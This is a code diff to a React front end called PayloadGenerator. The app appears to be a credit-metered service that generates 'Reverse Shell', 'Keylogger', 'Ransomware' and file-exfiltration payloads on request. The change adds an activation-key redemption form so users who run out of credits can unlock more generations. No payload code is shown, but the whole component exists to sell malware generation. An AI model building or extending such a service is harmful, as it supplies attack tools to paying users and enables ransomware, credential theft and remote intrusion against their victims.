@@ -5,15 +5,16 @@ import { useState } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import * as z from "zod";
-import { handleGeneratePayload } from "@/app/actions";
+import { handleGeneratePayload, redeemActivationKeyAction } from "@/app/actions";
 import { useAuth } from "@/contexts/AuthContext";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Textarea } from "@/components/ui/textarea";
+import { Input } from "@/components/ui/input";
 import { useToast } from "@/hooks/use-toast";
-import { Bot, Download, HardHat, Loader2, FileCode, Gem } from "lucide-react";
+import { Bot, Download, HardHat, Loader2, FileCode, Gem, Key } from "lucide-react";
 
 const formSchema = z.object({
   language: z.string({ required_error: "Please select a language." }).min(1, "Please select a language."),
@@ -29,6 +30,8 @@ const PAYLOAD_TYPES = ["Reverse Shell", "Keylogger", "Ransomware", "File Exfiltr
 export default function PayloadGenerator() {
   const [generatedCode, setGeneratedCode] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+  const [activationKey, setActivationKey] = useState("");
+  const [isActivating, setIsActivating] = useState(false);
   const { toast } = useToast();
   const { user, updateUser } = useAuth();
 
@@ -87,6 +90,21 @@ export default function PayloadGenerator() {
     a.click();
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
+  };
+  
+  const handleActivate = async () => {
+    if (!user?.email || !activationKey) return;
+    setIsActivating(true);
+    const result = await redeemActivationKeyAction({ email: user.email, key: activationKey });
+    setIsActivating(false);
+
+    if (result.success && result.user) {
+      updateUser(result.user);
+      toast({ title: "Success", description: result.message });
+      setActivationKey("");
+    } else {
+      toast({ variant: "destructive", title: "Activation Failed", description: result.message });
+    }
   };
 
   const hasCredits = user?.role === 'admin' || (user?.credits !== undefined && user.credits > 0);
@@ -183,6 +201,25 @@ export default function PayloadGenerator() {
               </Button>
             </form>
           </Form>
+          {!hasCredits && (
+              <div className="mt-6 space-y-4 rounded-lg border border-dashed border-accent p-4">
+                <h4 className="font-semibold text-center text-accent">Out of Credits</h4>
+                <p className="text-sm text-muted-foreground text-center">You've used all your credits. Please enter an activation key to add more.</p>
+                <div className="flex gap-2">
+                    <Input 
+                        placeholder="Enter your activation key"
+                        value={activationKey}
+                        onChange={(e) => setActivationKey(e.target.value)}
+                        disabled={isActivating}
+                    />
+                    <Button onClick={handleActivate} disabled={isActivating || !activationKey}>
+                        {isActivating && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
+                        <Key className="mr-2 h-4 w-4" />
+                        Activate
+                    </Button>
+                </div>
+              </div>
+          )}
         </CardContent>
       </Card>
       
